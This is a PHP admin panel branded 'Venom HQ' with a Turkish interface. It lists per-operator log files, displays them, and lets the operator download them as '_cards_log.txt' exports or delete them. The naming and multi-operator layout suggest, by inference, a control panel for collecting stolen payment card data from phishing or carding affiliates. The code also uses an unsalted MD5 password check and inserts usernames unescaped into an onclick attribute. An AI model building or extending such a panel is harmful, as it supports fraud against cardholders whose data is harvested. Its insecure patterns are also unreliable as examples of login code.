<?php
require_once 'config.php';

$authenticated = false;
if (isset($_SESSION['admin_logged']) && $_SESSION['admin_logged'] === true) {
    $authenticated = true;
}

// Giriş Kontrolü (Hata veren kısım düzeltildi)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (md5($_POST['password']) === ADMIN_MD5) {
        $_SESSION['admin_logged'] = true;
        $authenticated = true;
    } else {
        $error = "Erişim Reddedildi: Geçersiz Kod!";
    }
}

// Çıkış İşlemi
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['admin_logged']);
    header('Location: admin.php');
    exit;
}

// Belirli bir kullanıcının logunu silme
if (isset($_GET['delete_user']) && $authenticated) {
    $target_user = preg_replace("/[^a-zA-Z0-9-_]/", "", $_GET['delete_user']);
    $target_file = LOGS_DIR . $target_user . ".txt";
    if (file_exists($target_file)) { unlink($target_file); }
    header('Location: admin.php');
    exit;
}

// Doğrudan TXT olarak indirme mekanizması
if (isset($_GET['download_user']) && $authenticated) {
    $target_user = preg_replace("/[^a-zA-Z0-9-_]/", "", $_GET['download_user']);
    $target_file = LOGS_DIR . $target_user . ".txt";
    if (file_exists($target_file)) {
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="' . $target_user . '_cards_log.txt"');
        readfile($target_file);
        exit;
    }
}

// Log klasöründeki aktif kullanıcı dosyalarını tara
$active_loggers = [];
if ($authenticated && is_dir(LOGS_DIR)) {
    $files = scandir(LOGS_DIR);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..' && substr($file, -4) === '.txt') {
            $active_loggers[] = substr($file, 0, -4);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Venom HQ - Multi-User Controller</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon-color: #ff0055; --bg-color: #040406; --card-bg: rgba(13, 13, 17, 0.98); --success-color: #00ff66; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: white; margin: 0; padding: 20px; display: flex; justify-content: center; min-height: 100vh; box-sizing: border-box; }
        .admin-wrapper { background: var(--card-bg); width: 100%; max-width: 1100px; border-radius: 24px; border: 1px solid #3a1520; box-shadow: 0 20px 60px rgba(0,0,0,0.7); display: flex; flex-direction: column; padding: 30px; }
        .header-panel { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #231217; padding-bottom: 20px; margin-bottom: 25px; }
        h1 { margin: 0; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 10px var(--neon-color); font-size: 24px; }
        .subtitle { font-size: 11px; color: #5d5d6a; text-transform: uppercase; letter-spacing: 1.5px; margin-top: 4px; }
        .login-box { max-width: 360px; margin: 100px auto; text-align: center; width: 100%; }
        input[type="password"] { width: 100%; padding: 16px; background: #0f0f14; border: 1px solid #23232e; border-radius: 12px; color: white; text-align: center; font-size: 15px; margin-bottom: 15px; box-sizing: border-box; }
        .btn { background: linear-gradient(135deg, #ff0055, #a30030); color: white; border: none; padding: 14px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 13px; text-decoration: none; display: inline-block; width: 100%; }
        .btn-logout { background: #14141c; border: 1px solid #252533; color: #8c8c9e; width: auto; }
        .btn-logout:hover { background: #c92a2a; color: white; border-color: #c92a2a; }
        .workspace { display: grid; grid-template-columns: 280px 1fr; gap: 25px; flex: 1; min-height: 450px; }
        .user-sidebar { background: #08080b; border: 1px solid #1f1f2a; border-radius: 16px; padding: 15px; display: flex; flex-direction: column; gap: 10px; overflow-y: auto; max-height: 550px; }
        .user-sidebar h3 { margin: 0 0 10px 0; font-size: 12px; color: #5d5d6a; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #14141c; padding-bottom: 8px; }
        .user-button { width: 100%; padding: 14px; background: #111116; border: 1px solid #1f1f2a; border-radius: 10px; color: #a5a5b4; text-align: left; font-weight: bold; cursor: pointer; transition: 0.2s; display: flex; justify-content: space-between; align-items: center; }
        .user-button:hover, .user-button.active { border-color: var(--neon-color); color: white; background: rgba(255,0,85,0.05); }
        .user-button .badge { background: #1f1f2a; font-size: 10px; padding: 3px 8px; border-radius: 20px; color: var(--neon-color); border: 1px solid rgba(255,0,85,0.2); }
        .log-viewer-container { display: flex; flex-direction: column; background: #060609; border: 1px solid #1f1f2a; border-radius: 16px; padding: 20px; }
        .viewer-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; background: #0c0c12; padding: 12px 18px; border-radius: 10px; border: 1px solid #191924; display: none; }
        .viewer-title { font-weight: bold; font-size: 14px; text-transform: uppercase; color: var(--success-color); }
        .action-links { display: flex; gap: 10px; }
        .action-link { font-size: 11px; text-transform: uppercase; font-weight: bold; text-decoration: none; color: #fff; padding: 6px 12px; border-radius: 6px; border: 1px solid #333; }
        .link-download { background: rgba(0, 255, 102, 0.1); border-color: var(--success-color); color: var(--success-color); }
        .link-delete { background: rgba(255, 0, 85, 0.1); border-color: var(--neon-color); color: var(--neon-color); }
        .log-display { flex: 1; font-family: 'Courier New', monospace; font-size: 13px; color: #abb2bf; overflow-y: auto; white-space: pre-wrap; padding: 10px; border-radius: 8px; max-height: 460px; text-align: left; }
        .placeholder-text { display: flex; height: 100%; justify-content: center; align-items: center; color: #4e4e5d; font-weight: bold; text-transform: uppercase; font-size: 13px; }
        .error-msg { color: var(--neon-color); font-weight: bold; margin-bottom: 15px; }
        @media (max-width: 768px) { .workspace { grid-template-columns: 1fr; } }
    </style>
</head>
<body>

<?php if (!$authenticated): ?>
    <div class="login-box">
        <h1>Venom HQ</h1>
        <div class="subtitle" style="margin-bottom: 25px;">Yönetici Girişi</div>
        <?php if(isset($error)): ?> <div class="error-msg"><?= $error ?></div> <?php endif; ?>
        <form method="POST">
            <input type="password" name="password" placeholder="Terminal Şifresi" required autocomplete="off">
            <button type="submit" class="btn">Giriş Yap</button>
        </form>
    </div>
<?php else: ?>
    <div class="admin-wrapper">
        <div class="header-panel">
            <div>
                <h1>Yönetim Terminali</h1>
                <div class="subtitle">Kullanıcı Bazlı Filtreleme Paneli</div>
            </div>
            <a href="admin.php?action=logout" class="btn btn-logout">Çıkış Yap</a>
        </div>

        <div class="workspace">
            <div class="user-sidebar">
                <h3>Aktif Operatörler</h3>
                <?php if(empty($active_loggers)): ?>
                    <div style="font-size: 11px; color:#4e4e5d; text-align:center; margin-top:20px;">Henüz log kaydı yok.</div>
                <?php else: ?>
                    <?php foreach($active_loggers as $logger): 
                        $size = round(filesize(LOGS_DIR . $logger . ".txt") / 1024, 2) . " KB";
                    ?>
                        <button class="user-button" onclick="loadUserLog('<?= $logger ?>', this)">
                            <span>⚡ <?= htmlspecialchars($logger) ?></span>
                            <span class="badge"><?= $size ?></span>
                        </button>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>

            <div class="log-viewer-container">
                <div class="viewer-header" id="vHeader">
                    <div class="viewer-title">Takip Edilen: <span id="activeUserTitle" style="color:#fff;">-</span></div>
                    <div class="action-links">
                        <a href="#" id="dlLink" class="action-link link-download">TXT İndir</a>
                        <a href="#" id="delLink" class="action-link link-delete">Logları Sıfırla</a>
                    </div>
                </div>
                
                <div class="log-display" id="logBox">
                    <div class="placeholder-text">[ Sol taraftan bir kullanıcı seçerek loglarını inceleyebilirsiniz ]</div>
                </div>
            </div>
        </div>
    </div>

    <script>
    function loadUserLog(username, element) {
        document.querySelectorAll('.user-button').forEach(b => b.classList.remove('active'));
        element.classList.add('active');

        document.getElementById('vHeader').style.display = 'flex';
        document.getElementById('activeUserTitle').innerText = username;
        
        document.getElementById('dlLink').href = 'admin.php?download_user=' + encodeURIComponent(username);
        document.getElementById('delLink').href = 'admin.php?delete_user=' + encodeURIComponent(username);

        const logBox = document.getElementById('logBox');
        logBox.innerHTML = '<div style="color: #6c6c7d;">Veriler çekiliyor...</div>';

        fetch('logs/user_logs/' + encodeURIComponent(username) + '.txt?t=' + new Date().getTime())
            .then(response => {
                if(!response.ok) throw new Error();
                return response.text();
            })
            .then(data => { logBox.textContent = data; })
            .catch(() => { logBox.innerHTML = '<div style="color:#ff0055;">Log dosyası boş veya okunamadı.</div>'; });
    }
    </script>
<?php endif; ?>

</body>
</html>
